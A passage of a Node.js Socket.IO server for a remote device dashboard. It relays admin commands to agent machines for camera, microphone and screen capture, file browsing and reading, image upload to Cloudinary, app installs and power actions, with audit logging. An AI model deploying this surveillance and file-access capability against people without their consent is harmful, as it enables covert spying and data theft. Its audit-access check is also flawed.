            appContext: 'DeviceTelemetry',
            eventType: 'INPUT_CHANGE',
            targetElement: 'device_state_update',
            valuePreview: `State sync: ${recText} | ${camText} | ${voiceText} (src=${data.source || 'agent'})`,
            clientIp: socket.data?.clientIp || '127.0.0.1',
            metadata: { agentId: socket.id, machine: agents[socket.id].machine, ...data }
        });
    });

    // Helper to resolve target machine name for audit
    const getTargetDeviceName = (payload) => {
        if (payload?.targetId && agents[payload.targetId]) {
            return agents[payload.targetId].machine;
        }
        return payload?.targetId || 'All-Devices';
    };

    // Recording Controls
    socket.on('admin_start_capture', (payload) => {
        if (!isAdmin) {
            return;
        }
        const result = emitControl('start_capture', payload);
        emitControlAck('start_capture', result);

        logAudit({
            deviceId: getTargetDeviceName(payload),
            userId: socket.data?.user?.email || 'admin@operator',
            userRole: 'admin',
            appContext: 'MediaCapture',
            eventType: 'COMMAND_EXECUTE',
            targetElement: '#btn-start-rec',
            valuePreview: `Dispatched start_capture to target: ${getTargetDeviceName(payload)}`,
            metadata: { action: 'start_capture', payload }
        });
    });

    socket.on('admin_stop_capture', (payload) => {
        if (!isAdmin) {
            return;
        }
        const result = emitControl('stop_capture', payload);
        emitControlAck('stop_capture', result);

        logAudit({
            deviceId: getTargetDeviceName(payload),
            userId: socket.data?.user?.email || 'admin@operator',
            userRole: 'admin',
            appContext: 'MediaCapture',
            eventType: 'COMMAND_EXECUTE',
            targetElement: '#btn-stop-rec',
            valuePreview: `Dispatched stop_capture to target: ${getTargetDeviceName(payload)}`,
            metadata: { action: 'stop_capture', payload }
        });
    });

    socket.on('admin_start_all', () => {
        if (!isAdmin) {
            return;
        }
        const result = emitControl('start_capture');
        emitControlAck('start_capture', result);

        logAudit({
            deviceId: 'All-Devices',
            userId: socket.data?.user?.email || 'admin@operator',
            userRole: 'admin',
            appContext: 'MediaCapture',
            eventType: 'COMMAND_EXECUTE',
            targetElement: '#btn-start-all',
            valuePreview: 'Dispatched start_capture broadcast to ALL active devices',
            metadata: { action: 'start_capture_all' }
        });
    });

    socket.on('admin_stop_all', () => {
        if (!isAdmin) {
            return;
        }
        const result = emitControl('stop_capture');
        emitControlAck('stop_capture', result);

        logAudit({
            deviceId: 'All-Devices',
            userId: socket.data?.user?.email || 'admin@operator',
            userRole: 'admin',
            appContext: 'MediaCapture',
            eventType: 'COMMAND_EXECUTE',
            targetElement: '#btn-stop-all',
            valuePreview: 'Dispatched stop_capture broadcast to ALL active devices',
            metadata: { action: 'stop_capture_all' }
        });
    });

    // Camera Controls
    socket.on('admin_start_camera', (payload) => {
        if (!isAdmin) {
            return;
        }
        const result = emitControl('start_camera', payload);
        emitControlAck('start_camera', result);

        logAudit({
            deviceId: getTargetDeviceName(payload),
            userId: socket.data?.user?.email || 'admin@operator',
            userRole: 'admin',
            appContext: 'MediaCapture',
            eventType: 'COMMAND_EXECUTE',
            targetElement: '#btn-start-cam',
            valuePreview: `Dispatched start_camera to target: ${getTargetDeviceName(payload)}`,
            metadata: { action: 'start_camera', payload }
        });
    });

    socket.on('admin_stop_camera', (payload) => {
        if (!isAdmin) {
            return;
        }
        const result = emitControl('stop_camera', payload);
        emitControlAck('stop_camera', result);

        logAudit({
            deviceId: getTargetDeviceName(payload),
            userId: socket.data?.user?.email || 'admin@operator',
            userRole: 'admin',
            appContext: 'MediaCapture',
            eventType: 'COMMAND_EXECUTE',
            targetElement: '#btn-stop-cam',
            valuePreview: `Dispatched stop_camera to target: ${getTargetDeviceName(payload)}`,
            metadata: { action: 'stop_camera', payload }
        });
    });

    socket.on('admin_start_voice', (payload) => {
        if (!isAdmin) {
            return;
        }
        const result = emitControl('start_voice_capture', payload);
        emitControlAck('start_voice_capture', result);

        logAudit({
            deviceId: getTargetDeviceName(payload),
            userId: socket.data?.user?.email || 'admin@operator',
            userRole: 'admin',
            appContext: 'MediaCapture',
            eventType: 'COMMAND_EXECUTE',
            targetElement: '#btn-start-voice',
            valuePreview: `Dispatched start_voice to target: ${getTargetDeviceName(payload)}`,
            metadata: { action: 'start_voice_capture', payload }
        });
    });

    socket.on('admin_stop_voice', (payload) => {
        if (!isAdmin) {
            return;
        }
        const result = emitControl('stop_voice_capture', payload);
        emitControlAck('stop_voice_capture', result);

        logAudit({
            deviceId: getTargetDeviceName(payload),
            userId: socket.data?.user?.email || 'admin@operator',
            userRole: 'admin',
            appContext: 'MediaCapture',
            eventType: 'COMMAND_EXECUTE',
            targetElement: '#btn-stop-voice',
            valuePreview: `Dispatched stop_voice to target: ${getTargetDeviceName(payload)}`,
            metadata: { action: 'stop_voice_capture', payload }
        });
    });

    socket.on('admin_start_screen_stream', (payload) => {
        if (!isAdmin && !isViewer) {
            return;
        }
        const result = emitControl('start_screen_stream', payload);
        emitControlAck('start_screen_stream', result);

        logAudit({
            deviceId: getTargetDeviceName(payload),
            userId: socket.data?.user?.email || 'admin@operator',
            userRole: 'admin',
            appContext: 'ScreenStream',
            eventType: 'COMMAND_EXECUTE',
            targetElement: '#btn-start-stream',
            valuePreview: `Dispatched start_screen_stream to target: ${getTargetDeviceName(payload)}`,
            metadata: { action: 'start_screen_stream', payload }
        });
    });

    socket.on('admin_stop_screen_stream', (payload) => {
        if (!isAdmin && !isViewer) {
            return;
        }
        const result = emitControl('stop_screen_stream', payload);
        emitControlAck('stop_screen_stream', result);

        logAudit({
            deviceId: getTargetDeviceName(payload),
            userId: socket.data?.user?.email || 'admin@operator',
            userRole: 'admin',
            appContext: 'ScreenStream',
            eventType: 'COMMAND_EXECUTE',
            targetElement: '#btn-stop-stream',
            valuePreview: `Dispatched stop_screen_stream to target: ${getTargetDeviceName(payload)}`,
            metadata: { action: 'stop_screen_stream', payload }
        });
    });

    socket.on('admin_webrtc_offer', (payload = {}) => {
        if (!isAdmin && !isViewer) {
            return;
        }
        const data = {
            ...payload,
            viewerSocketId: socket.id
        };
        const result = emitControl('webrtc_offer', data);
        emitControlAck('webrtc_offer', result);
    });

    socket.on('admin_webrtc_ice_candidate', (payload = {}) => {
        if (!isAdmin && !isViewer) {
            return;
        }
        const data = {
            ...payload,
            viewerSocketId: socket.id
        };
        emitControl('webrtc_ice_candidate', data);
    });

    socket.on('admin_webrtc_stop', (payload = {}) => {
        if (!isAdmin && !isViewer) {
            return;
        }
        const data = {
            ...payload,
            viewerSocketId: socket.id
        };
        const result = emitControl('webrtc_stop', data);
        emitControlAck('webrtc_stop', result);
    });

    socket.on('admin_find_image_and_save', (payload) => {
        if (!isAdmin) {
            return;
        }
        const result = emitControl('find_image_and_save', payload);
        emitControlAck('find_image_and_save', result);
    });

    socket.on('admin_stop_image_sync', (payload) => {
        if (!isAdmin) {
            return;
        }
        const result = emitControl('stop_image_sync', payload);
        emitControlAck('stop_image_sync', result);
    });

    socket.on('admin_reset_image_sync', (payload) => {
        if (!isAdmin) {
            return;
        }
        const result = emitControl('reset_image_sync', payload);
        emitControlAck('reset_image_sync', result);
    });

    socket.on('admin_get_image_sync_status', (payload) => {
        if (!isAdmin) {
            return;
        }
        const result = emitControl('get_image_sync_status', payload);
        emitControlAck('get_image_sync_status', result);
    });

    socket.on('admin_list_directories', (payload = {}) => {
        if (!isAdmin) {
            return;
        }
        emitControl('list_directories', payload);
        logAudit({
            deviceId: getTargetDeviceName(payload),
            userId: socket.data?.user?.email || 'admin@operator',
            userRole: 'admin',
            appContext: 'FileExplorer',
            eventType: 'SEARCH',
            targetElement: 'explorer_browse',
            valuePreview: `Request directory listing: "${payload.path || payload.parentPath || 'Root'}"`,
            metadata: payload
        });
    });

    socket.on('admin_read_file_chunk', (payload = {}) => {
        if (!isAdmin) return;
        emitControl('read_file_chunk', payload);
    });

    socket.on('admin_search_files', (payload = {}) => {
        if (!isAdmin) return;
        emitControl('search_files', payload);
        logAudit({
            deviceId: getTargetDeviceName(payload),
            userId: socket.data?.user?.email || 'admin@operator',
            userRole: 'admin',
            appContext: 'FileExplorer',
            eventType: 'SEARCH',
            targetElement: '#file-search-input',
            valuePreview: `Search remote files: "${payload.query || ''}"`,
            metadata: payload
        });
    });

    socket.on('admin_list_installed_apps', (payload = {}) => {
        if (!isAdmin) return;
        emitControl('list_installed_apps', payload);
        logAudit({
            deviceId: getTargetDeviceName(payload),
            userId: socket.data?.user?.email || 'admin@operator',
            userRole: 'admin',
            appContext: 'AppManager',
            eventType: 'SEARCH',
            targetElement: '#btn-refresh-apps',
            valuePreview: `Request installed application inventory for: ${getTargetDeviceName(payload)}`,
            metadata: payload
        });
    });

    socket.on('admin_uninstall_app', (payload = {}) => {
        if (!isAdmin) return;
        emitControl('uninstall_app', payload);
        logAudit({
            deviceId: getTargetDeviceName(payload),
            userId: socket.data?.user?.email || 'admin@operator',
            userRole: 'admin',
            appContext: 'AppManager',
            eventType: 'COMMAND_EXECUTE',
            targetElement: 'btn_uninstall_app',
            valuePreview: `Trigger uninstall: "${payload.displayName || payload.appName || payload.identKey || 'package'}"`,
            metadata: payload
        });
    });

    socket.on('admin_install_app', (payload = {}) => {
        if (!isAdmin) return;
        emitControl('install_app', payload);
        logAudit({
            deviceId: getTargetDeviceName(payload),
            userId: socket.data?.user?.email || 'admin@operator',
            userRole: 'admin',
            appContext: 'AppManager',
            eventType: 'COMMAND_EXECUTE',
            targetElement: 'btn_install_app',
            valuePreview: `Trigger install: "${payload.packageId || payload.packageName || payload.source || 'package'}"`,
            metadata: payload
        });
    });

    socket.on('admin_search_packages', (payload = {}) => {
        if (!isAdmin) return;
        emitControl('search_packages', payload);
    });

    socket.on('admin_system_power_action', (payload = {}) => {
        if (!isAdmin) return;
        emitControl('system_power_action', payload);
        logAudit({
            deviceId: getTargetDeviceName(payload),
            userId: socket.data?.user?.email || 'admin@operator',
            userRole: 'admin',
            appContext: 'PowerManagement',
            eventType: 'COMMAND_EXECUTE',
            targetElement: 'btn_system_power',
            valuePreview: `System power command: ${payload.action || 'action'} -> ${getTargetDeviceName(payload)}`,
            metadata: payload
        });
    });

    socket.on('admin_system_restart', (payload = {}) => {
        if (!isAdmin) return;
        emitControl('system_restart', payload);
        logAudit({
            deviceId: getTargetDeviceName(payload),
            userId: socket.data?.user?.email || 'admin@operator',
            userRole: 'admin',
            appContext: 'PowerManagement',
            eventType: 'COMMAND_EXECUTE',
            targetElement: 'btn_system_restart',
            valuePreview: `System restart command -> ${getTargetDeviceName(payload)}`,
            metadata: payload
        });
    });

    // Relay Camera Frames from Agent to Dashboard
    socket.on('camera_frame', (data) => {
        if (isAdmin || isViewer) {
            return;
        }

        const agent = agents[socket.id] || { machine: 'Unknown-PC' };
        io.to(ADMIN_ROOM).to(VIEWER_ROOM).emit('ui_camera_display', {
            ...data,
            agentId: socket.id,
            machine: agent.machine
        });
    });

    socket.on('screen_stream_frame', (data = {}) => {
        if (isAdmin || isViewer) {
            return;
        }

        const agent = agents[socket.id] || { machine: 'Unknown-PC' };
        io.to(ADMIN_ROOM).to(VIEWER_ROOM).emit('ui_screen_stream_frame', {
            ...data,
            agentId: socket.id,
            machine: agent.machine,
            sentAt: Date.now()
        });
    });

    socket.on('webrtc_answer', (data = {}) => {
        if (isAdmin || isViewer) {
            return;
        }
        const viewerSocketId = data.viewerSocketId;
        if (!viewerSocketId) {
            return;
        }
        io.to(viewerSocketId).emit('webrtc_answer', {
            ...data,
            agentId: socket.id
        });
    });

    socket.on('webrtc_ice_candidate', (data = {}) => {
        if (isAdmin || isViewer) {
            return;
        }
        const viewerSocketId = data.viewerSocketId;
        if (!viewerSocketId) {
            return;
        }
        io.to(viewerSocketId).emit('webrtc_ice_candidate', {
            ...data,
            agentId: socket.id
        });
    });

    socket.on('webrtc_status', (data = {}) => {
        if (isAdmin || isViewer) {
            return;
        }
        const viewerSocketId = data.viewerSocketId;
        if (!viewerSocketId) {
            return;
        }
        io.to(viewerSocketId).emit('webrtc_status', {
            ...data,
            agentId: socket.id
        });
    });

    socket.on('video_upload_complete', (data) => {
        if (isAdmin || isViewer) {
            return;
        }

        const agent = agents[socket.id] || { machine: 'Unknown-PC' };
        const devName = data?.machine || agent.machine;
        io.to(ADMIN_ROOM).to(VIEWER_ROOM).emit('new_video_link', {
            ...data,
            mediaType: data?.mediaType || 'video',
            agentId: socket.id,
            machine: devName
        });

        logAudit({
            deviceId: devName,
            userId: 'AgentDaemon',
            userRole: 'agent',
            appContext: 'MediaStorage',
            eventType: 'EXPORT_CLOUDINARY',
            targetElement: 'video_upload_complete',
            valuePreview: `Uploaded video: ${data?.url || data?.secure_url || data?.public_id || 'saved'}`,
            metadata: data
        });
    });

    socket.on('audio_upload_complete', (data) => {
        if (isAdmin || isViewer) {
            return;
        }

        const agent = agents[socket.id] || { machine: 'Unknown-PC' };
        const devName = data?.machine || agent.machine;
        io.to(ADMIN_ROOM).to(VIEWER_ROOM).emit('new_video_link', {
            ...data,
            mediaType: 'audio',
            agentId: socket.id,
            machine: devName
        });

        logAudit({
            deviceId: devName,
            userId: 'AgentDaemon',
            userRole: 'agent',
            appContext: 'MediaStorage',
            eventType: 'EXPORT_CLOUDINARY',
            targetElement: 'audio_upload_complete',
            valuePreview: `Uploaded audio: ${data?.url || data?.secure_url || data?.public_id || 'saved'}`,
            metadata: data
        });
    });

    socket.on('image_upload_complete', (data = {}) => {
        if (isAdmin || isViewer) {
            return;
        }

        const agent = agents[socket.id] || { machine: 'Unknown-PC' };
        const devName = data?.machine || agent.machine;
        io.to(ADMIN_ROOM).to(VIEWER_ROOM).emit('new_video_link', {
            ...data,
            mediaType: 'image',
            agentId: socket.id,
            machine: devName
        });

        logAudit({
            deviceId: devName,
            userId: 'AgentDaemon',
            userRole: 'agent',
            appContext: 'MediaStorage',
            eventType: 'EXPORT_CLOUDINARY',
            targetElement: 'image_upload_complete',
            valuePreview: `Uploaded image sync file: ${data?.url || data?.secure_url || data?.public_id || 'saved'}`,
            metadata: data
        });
    });

    socket.on('image_sync_status', (data = {}) => {
        if (isAdmin) {
            return;
        }

        const agent = agents[socket.id] || { machine: 'Unknown-PC' };
        const stage = String(data.stage || '');
        const isRunning = ['started', 'queued', 'scanning', 'retrying', 'stopping', 'already_running', 'resetting'].includes(stage);
        const scanPath = typeof data.scanPath === 'string' ? data.scanPath : '';
        const allowedExtensions = Array.isArray(data.allowedExtensions) ? data.allowedExtensions : (agents[socket.id]?.imageSyncAllowedExtensions || null);

        agents[socket.id] = {
            ...(agents[socket.id] || { id: socket.id, machine: data.machine || agent.machine }),
            imageSyncRunning: isRunning,
            imageSyncNextIndex: Number(data.nextIndex ?? data.index ?? 0) || 0,
            imageSyncTotalFiles: Number(data.totalFiles ?? data.total ?? 0) || 0,
            imageSyncScanPath: scanPath,
            imageSyncAllowedExtensions: allowedExtensions,
            lastImageSyncAt: Date.now()
        };

        emitAgentList();
        io.to(ADMIN_ROOM).to(VIEWER_ROOM).emit('ui_image_sync_status', {
            ...data,
            agentId: socket.id,
            machine: data?.machine || agent.machine
        });
    });

    socket.on('image_sync_snapshot', (data = {}) => {
        if (isAdmin) {
            return;
        }

        const agent = agents[socket.id] || { machine: 'Unknown-PC' };
        const scanPath = typeof data.scanPath === 'string' ? data.scanPath : '';
        const allowedExtensions = Array.isArray(data.allowedExtensions) ? data.allowedExtensions : (agents[socket.id]?.imageSyncAllowedExtensions || null);
        agents[socket.id] = {
            ...(agents[socket.id] || { id: socket.id, machine: data.machine || agent.machine }),
            imageSyncRunning: Boolean(data.running),
            imageSyncNextIndex: Number(data.nextIndex ?? 0) || 0,
            imageSyncTotalFiles: Number(data.totalFiles ?? 0) || 0,
            imageSyncScanPath: scanPath,
            imageSyncAllowedExtensions: allowedExtensions,
            lastImageSyncAt: Date.now()
        };

        emitAgentList();
        io.to(ADMIN_ROOM).emit('ui_image_sync_snapshot', {
            ...data,
            agentId: socket.id,
            machine: data?.machine || agent.machine
        });
    });

    socket.on('directory_listing', (data = {}) => {
        if (isAdmin || isViewer) {
            return;
        }

        const agent = agents[socket.id] || { machine: 'Unknown-PC' };
        const devName = data?.machine || agent.machine;
        io.to(ADMIN_ROOM).emit('ui_directory_listing', {
            ...data,
            agentId: socket.id,
            machine: devName
        });

        logAudit({
            deviceId: devName,
            userId: 'AgentDaemon',
            userRole: 'agent',
            appContext: 'FileExplorer',
            eventType: 'SEARCH',
            targetElement: 'directory_listing_result',
            valuePreview: `Remote filesystem listed: "${data.parentPath || 'Root'}" (${(data.entries || []).length} items)`,
            metadata: { parentPath: data.parentPath, count: (data.entries || []).length }
        });
    });

    socket.on('file_chunk_data', (data = {}) => {
        if (isAdmin || isViewer) return;
        const agent = agents[socket.id] || { machine: 'Unknown-PC' };
        const devName = data?.machine || agent.machine;
        io.to(ADMIN_ROOM).emit('ui_file_chunk_data', {
            ...data,
            agentId: socket.id,
            machine: devName
        });
    });

    socket.on('search_files_result', (data = {}) => {
        if (isAdmin || isViewer) return;
        const agent = agents[socket.id] || { machine: 'Unknown-PC' };
        const devName = data?.machine || agent.machine;
        io.to(ADMIN_ROOM).emit('ui_search_files_result', {
            ...data,
            agentId: socket.id,
            machine: devName
        });

        logAudit({
            deviceId: devName,
            userId: 'AgentDaemon',
            userRole: 'agent',
            appContext: 'FileExplorer',
            eventType: 'SEARCH',
            targetElement: 'file_search_result',
            valuePreview: `File search completed: ${(data.results || []).length} match(es)`,
            metadata: { count: (data.results || []).length }
        });
    });

    socket.on('installed_apps_list', (data = {}) => {
        if (isAdmin || isViewer) return;
        const agent = agents[socket.id] || { machine: 'Unknown-PC' };
        const devName = data?.machine || agent.machine;
        io.to(ADMIN_ROOM).emit('ui_installed_apps_list', {
            ...data,
            agentId: socket.id,
            machine: devName
        });

        logAudit({
            deviceId: devName,
            userId: 'AgentDaemon',
            userRole: 'agent',
            appContext: 'AppManager',
            eventType: 'SEARCH',
            targetElement: 'installed_apps_result',
            valuePreview: `Installed software inventory loaded: ${(data.apps || []).length} programs`,
            metadata: { count: (data.apps || []).length }
        });
    });

    socket.on('uninstall_app_result', (data = {}) => {
        if (isAdmin || isViewer) return;
        const agent = agents[socket.id] || { machine: 'Unknown-PC' };
        const devName = data?.machine || agent.machine;
        io.to(ADMIN_ROOM).emit('ui_uninstall_app_result', {
            ...data,
            agentId: socket.id,
            machine: devName
        });

        logAudit({
            deviceId: devName,
            userId: 'AgentDaemon',
            userRole: 'agent',
            appContext: 'AppManager',
            eventType: 'COMMAND_EXECUTE',
            targetElement: 'uninstall_app_result',
            valuePreview: `Uninstall result: ${data.success ? 'SUCCESS' : 'FAILED'} (${data.error || ''})`,
            metadata: data
        });
    });

    socket.on('install_app_status', (data = {}) => {
        if (isAdmin || isViewer) return;
        const agent = agents[socket.id] || { machine: 'Unknown-PC' };
        io.to(ADMIN_ROOM).emit('ui_install_app_status', {
            ...data,
            agentId: socket.id,
            machine: data?.machine || agent.machine
        });
    });

    socket.on('install_app_result', (data = {}) => {
        if (isAdmin || isViewer) return;
        const agent = agents[socket.id] || { machine: 'Unknown-PC' };
        const devName = data?.machine || agent.machine;
        io.to(ADMIN_ROOM).emit('ui_install_app_result', {
            ...data,
            agentId: socket.id,
            machine: devName
        });

        logAudit({
            deviceId: devName,
            userId: 'AgentDaemon',
            userRole: 'agent',
            appContext: 'AppManager',
            eventType: 'COMMAND_EXECUTE',
            targetElement: 'install_app_result',
            valuePreview: `Installation finished: ${data.success ? 'SUCCESS' : 'FAILED'} (${data.error || ''})`,
            metadata: data
        });
    });

    socket.on('search_packages_result', (data = {}) => {
        if (isAdmin || isViewer) return;
        const agent = agents[socket.id] || { machine: 'Unknown-PC' };
        io.to(ADMIN_ROOM).emit('ui_search_packages_result', {
            ...data,
            agentId: socket.id,
            machine: data?.machine || agent.machine
        });
    });

    socket.on('system_power_result', (data = {}) => {
        if (isAdmin || isViewer) return;
        const agent = agents[socket.id] || { machine: 'Unknown-PC' };
        const devName = data?.machine || agent.machine;
        io.to(ADMIN_ROOM).emit('ui_system_power_result', {
            ...data,
            agentId: socket.id,
            machine: devName
        });

        logAudit({
            deviceId: devName,
            userId: 'AgentDaemon',
            userRole: 'agent',
            appContext: 'PowerManagement',
            eventType: 'COMMAND_EXECUTE',
            targetElement: 'system_power_result',
            valuePreview: `Power execution result: ${data?.action || 'action'} -> ${data?.success ? 'SUCCESS' : 'FAILED'}`,
            metadata: data
        });
    });

    socket.on('agent_update_status', (data = {}) => {
        if (isAdmin) {
            return;
        }

        const agent = agents[socket.id] || { machine: 'Unknown-PC' };
        io.to(ADMIN_ROOM).emit('ui_agent_update_status', {
            ...data,
            agentId: socket.id,
            machine: data?.machine || agent.machine
        });
    });

    
    socket.on('in_app_audit_event', (data) => {
        if (!data) return;
        const clientIp = socket.data.clientIp || '127.0.0.1';
        const senderAgent = agents[socket.id];
        const deviceId = data.deviceId || senderAgent?.machine || (isAdmin ? 'Local-Admin-Console' : 'Web-Dashboard');
        const user = data.userId || socket.data.user?.email || socket.data.user?.uid || (isAdmin ? 'admin' : (senderAgent ? 'AgentDaemon' : 'System'));
        const userRole = data.userRole || socket.data.role || (isAdmin ? 'admin' : (senderAgent ? 'agent' : 'system'));

        logAudit({
            ...data,
            deviceId: deviceId,
            userId: user,
            userRole: userRole,
            clientIp: clientIp
        });
    });

    socket.on('admin_audit_get_snapshot', (filters) => {
        if (!isAdmin && firebaseAdminReady) return;
        const result = auditManager.queryEvents(filters || {});
        const stats = auditManager.getStats(Object.values(agents));
        socket.emit('ui_audit_snapshot', { ...result, stats });
    });

    socket.on('admin_force_update_all', () => {
        if (!isAdmin) {
            return;
        }

        emitControl('force_update_check');
        io.to(ADMIN_ROOM).emit('ui_update_broadcast_sent', {
            scope: 'all',
            sentAt: Date.now(),
            by: socket.data.user?.email || socket.data.user?.uid || 'admin'
        });
    });

    socket.on('disconnect', () => {
        if (isAdmin) {
            console.log(`[admin] disconnected: ${socket.id}`);
            return;
        }
        if (isViewer) {
            console.log(`[viewer] disconnected: ${socket.id}`);
            return;
        }

        console.log(`[agent-socket] disconnected: ${socket.id}`);
        const disconnectingAgent = agents[socket.id];
        const machineName = disconnectingAgent?.machine || 'Unknown-PC';
        delete agents[socket.id];
        emitAgentList();

        try {
            const disconnectEvt = auditManager.recordEvent({
                deviceId: machineName,
                userId: 'System',
                userRole: 'agent',
                appContext: 'AgentLifecycle',
                eventType: 'CONFIG_CHANGE',
                targetElement: 'agent_disconnection',
                valuePreview: `Agent offline: ${machineName} (${socket.id.slice(0, 6)})`,
                clientIp: socket.data?.clientIp || '127.0.0.1',
                metadata: { machine: machineName, agentId: socket.id }
            });
            if (disconnectEvt) {
                io.to(ADMIN_ROOM).emit('ui_audit_event_live', disconnectEvt);
            }
        } catch (err) {
            console.error('[audit] Failed to record disconnect event:', err.message);
        }

        io.to(ADMIN_ROOM).to(VIEWER_ROOM).emit('ui_agent_state', {
            agentId: socket.id,
            online: false,
            recording: false,
            cameraOn: false,
            voiceRecording: false,
            screenStreaming: false,
            source: 'disconnect'
        });
    });
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on 0.0.0.0:${PORT}`);
    console.log(`Allowed CLIENT_ORIGIN: ${CLIENT_ORIGIN}`);
});
